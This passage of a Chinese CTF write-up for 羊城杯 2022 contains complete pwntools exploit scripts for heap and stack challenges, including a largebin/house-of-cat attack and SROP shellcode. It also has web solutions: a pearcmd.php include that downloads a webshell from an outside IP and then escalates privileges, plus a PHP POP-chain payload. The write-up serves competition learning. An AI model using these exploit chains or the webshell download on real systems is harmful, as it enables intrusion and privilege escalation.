class="params">index,offset</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">link</span>(<span class="params">id1,id2</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;link from:&quot;</span>,<span class="built_in">str</span>(id1))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;link to:&quot;</span>,<span class="built_in">str</span>(id2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unlink</span>(<span class="params">index,offset</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x70</span>,p64(<span class="number">0</span>)+p64(<span class="number">0X451</span>))</span><br><span class="line"></span><br><span class="line">link(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">unlink(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0xff</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">link(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Offset 1:&quot;</span>)</span><br><span class="line">heap_base=u64(r.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x2e0</span></span><br><span class="line">success(<span class="string">&quot;heap_base = &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">link(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">unlink(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x450</span>)+p64(heap_base+<span class="number">0x3b0</span>)</span><br><span class="line">add(<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;z&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">8</span>)+p64(heap_base+<span class="number">0x460</span>)</span><br><span class="line">add(<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line">link(<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">libc_base=u64(r.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x10</span> -<span class="number">96</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">6</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(free_hook)*<span class="number">3</span></span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">add(<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="fakenooutput"><a class="markdownIt-Anchor" href="#fakenooutput"></a> fakeNoOutput</h3>
<p>这道题目就有点难受，首先是一堆的逆向操作。但是实际上就是一个栈溢出，并且溢出了非常多的字节。但是想要让程序执行到溢出点还是有点的困难。首先我们发现溢出点在upload里面的strcpy(s, haystack);这个部分，然后我们只需要让函数调用upload就可以溢出。但是首先要通过sub_804976F这个函数里面的验证，经过逆向调试发现，就是一个伪随机数，我们直接输入就行。然后溢出的自己大小和Content-Length有较大的关系，因此我们要设置Content-Length的大小来控制溢出的长度。之后由于函数限制的原因，无法ret2libc，因此我们经过精心构造，返回到http_puts函数，然后就能够泄露出got表里的内容，之后再返回主函数再溢出一次就行，就能够拿到shell。让人十分不解的是不知道为什么第二个端口一直打不通，泄露不出来东西，第一个端口多跑两次就能够打通远端。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(5).PNG" alt="1280X1280 (5)"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> execve</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/比赛/羊城杯/fakeNoOutput/fakeNoOutput&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">20432</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/fakeNoOutput/fakeNoOutput&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/fakeNoOutput/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;POST /upload /  &quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&quot;Content-Length:0x4022\t&quot;</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">payload3=<span class="string">&quot;HTTP_SERVER1_token:wR5qH796Ky8D03r2W7syLB7406e30xP7\t&quot;</span></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;Content:zzzzfilename=zzzz&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">strlen_got=elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">strstr_plt=elf.plt[<span class="string">&#x27;strstr&#x27;</span>]</span><br><span class="line"><span class="comment"># payload=(p32(0x804D1a0)+p32(0x8049F77)+p32(0x804D010)).rjust(0x1040,b&#x27;a&#x27;)+p32(0x804D1A0+0x103c-8)+p32(0x80496A8)</span></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1040</span>+p32(<span class="number">0x804D1A0</span>+<span class="number">0x4000</span>-<span class="number">4</span>)+p32(<span class="number">0x80496A8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x4000</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(<span class="number">0x8049F77</span>)+p32(<span class="number">0x804D010</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base=u32(r.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.symbols[<span class="string">&#x27;strstr&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">execve_addr=libc_base+libc.symbols[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0xcc9ab</span></span><br><span class="line">gadget2=<span class="number">0x145f43</span></span><br><span class="line">gadget3=<span class="number">0x145f44</span></span><br><span class="line">one_gadget=libc_base+gadget1</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;POST /upload /  &quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&quot;Content-Length:0xece\t&quot;</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">payload3=<span class="string">&quot;HTTP_SERVER1_token:5lnPP74OkC4N9U8smBU812Smk1XxvRBJ\t&quot;</span></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;Content:zzzzfilename=zzzz&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xe9c</span>+p32(execve_addr)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="dream"><a class="markdownIt-Anchor" href="#dream"></a> Dream</h3>
<p>说是dream，实际上就是一个largebin attack，然后UAF漏洞，函数功能还都比较齐全。主要是开启了沙箱不能拿到shell，并且show函数里面有一个加密的过程，想要泄露数据必须要完成逆向，之后我们直接利用qwb里面house of cat的做法，一次largebin attack攻击malloc assert即可实现orw读取flag并泄露。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280(6).PNG" alt="1280X1280(6)"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/比赛/羊城杯/dream/dream&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">26422</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/dream/dream&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/glibc-all-in-one/libs/2.32-0ubuntu3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Give me a dream ID: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;how long: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;dream: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream to wake?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream do you want to show?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream to make?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">&quot;dream: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">payload,<span class="built_in">len</span></span>):</span><br><span class="line">   key = [<span class="number">9</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">7</span>]</span><br><span class="line">   v9 = <span class="number">52</span> // <span class="built_in">len</span> + <span class="number">6</span></span><br><span class="line">   delta = <span class="number">0</span></span><br><span class="line">   delta -= v9 * <span class="number">0x61C88647</span></span><br><span class="line">   delta &amp;= <span class="number">0xffffffff</span></span><br><span class="line">   bk = payload[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span>(v9):</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>)[::-<span class="number">1</span>]:</span><br><span class="line">         fd = payload[i - <span class="number">1</span>]</span><br><span class="line">         payload[i] -= (((<span class="number">8</span> * bk) ^ (fd &gt;&gt; <span class="number">7</span>)) + ((bk &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * fd))) ^ ((bk ^ delta) + (fd ^ key[((delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) ^ i &amp; <span class="number">3</span>]))</span><br><span class="line">         payload[i] &amp;= <span class="number">0xffffffff</span></span><br><span class="line">         bk = payload[i]</span><br><span class="line">      i -= <span class="number">1</span></span><br><span class="line">      fd = payload[<span class="built_in">len</span> - <span class="number">1</span>]</span><br><span class="line">      payload[<span class="number">0</span>] -= (((<span class="number">8</span> * bk) ^ (fd &gt;&gt; <span class="number">7</span>)) + ((bk &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * fd))) ^ ((bk ^ delta) + (fd ^ key[((delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) ^ i &amp; <span class="number">3</span>]))</span><br><span class="line">      payload[<span class="number">0</span>] &amp;= <span class="number">0xffffffff</span></span><br><span class="line">      bk = payload[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">      delta += <span class="number">0x61C88647</span></span><br><span class="line">      delta &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">      v9-=<span class="number">1</span></span><br><span class="line">   <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>,<span class="string">&quot;c&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payloads=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x420</span>//<span class="number">4</span>):</span><br><span class="line">    payloads.append(<span class="built_in">int</span>.from_bytes(r.recv(<span class="number">4</span>), <span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">payloads=de(payloads,<span class="number">0x420</span>//<span class="number">4</span>)</span><br><span class="line">main_arena=(payloads[<span class="number">0</span>]+(payloads[<span class="number">1</span>]&lt;&lt;<span class="number">32</span>)) - <span class="number">96</span></span><br><span class="line">libc_base=main_arena - <span class="number">0x10</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">stderr_addr=libc_base+libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">set_context=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payloads1=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400</span>//<span class="number">4</span>):</span><br><span class="line">    payloads1.append(<span class="built_in">int</span>.from_bytes(r.recv(<span class="number">4</span>), <span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">payloads1=de(payloads1,<span class="number">0x400</span>//<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">heap_base=(payloads1[<span class="number">2</span>]+(payloads1[<span class="number">3</span>]&lt;&lt;<span class="number">32</span>)) - <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;heap_base = &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">payload=p64(main_arena+<span class="number">96</span>)*<span class="number">2</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x410</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(heap_base&gt;&gt;<span class="number">12</span>)+p64(heap_base+<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stderr_addr - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x4f0</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>,<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x438</span>+p64(<span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line">fake_io_addr=heap_base+<span class="number">0xad0</span> </span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(heap_base)         </span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xee0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)</span><br><span class="line">fake_IO_FILE +=p64(set_context)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x1000</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x1e4f80</span>+<span class="number">0x10</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">shellcode_addr=heap_base+<span class="number">0xee0</span>+<span class="number">0x300</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line"></span><br><span class="line">frame.rsp = shellcode_addr+<span class="number">0x20</span></span><br><span class="line">frame.rdi = heap_base</span><br><span class="line">frame.rsi = <span class="number">0x10000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">frame.rip = libc_base+libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">code = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">code += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.exit(<span class="number">0</span>)</span><br><span class="line">shellcode=asm(code)</span><br><span class="line">payload=<span class="built_in">bytes</span>(frame)[<span class="number">0x20</span>:].ljust(<span class="number">0x300</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(shellcode_addr+<span class="number">0x28</span>)+shellcode</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">1</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Give me a dream ID: &quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;how long: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x4f0</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="rce_me"><a class="markdownIt-Anchor" href="#rce_me"></a> rce_me</h3>
<p>扫进程扫到了这个</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(6).PNG" alt="1280X1280 (6)"></p>
<p>直接读根目录/flag，没有权限，应该是需要连木马提权</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(7).PNG" alt="1280X1280 (7)"></p>
<p>找了一圈死活找不到可以包含的文件，最后要拿pearcmd.php去下载文件然后包含，过滤的字符串可以url编码绕过。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/%70%65%61%72cmd.php&amp;+download+http://101.43.255.238/1.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(8).PNG" alt="img"></p>
<p>下载文件直接到web目录成功</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(9).PNG" alt="img"></p>
<p>包含文件+蚁剑连接+date提权</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(10).PNG" alt="img"></p>
<h3 id="step_by_step-v3"><a class="markdownIt-Anchor" href="#step_by_step-v3"></a> step_by_step-v3</h3>
<p>pop链题目，这里应该是要跳到hint那里去绕过include_once包含文件，但是过滤很多，包含不进去，然后就看到<code>($this-&gt;y1)();</code>可以看phpinfo，结果flag直接出来了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;flag = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;<span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$k1</span>,<span class="variable">$k2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$n1</span>,<span class="variable">$n2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">cheng</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">bei</span>();</span><br><span class="line"><span class="variable">$y</span>=<span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line"><span class="variable">$y1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;c1=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b1=<span class="variable">$y</span>;</span><br><span class="line"><span class="variable">$y</span>-&gt;y1=<span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;cheng&quot;</span>:<span 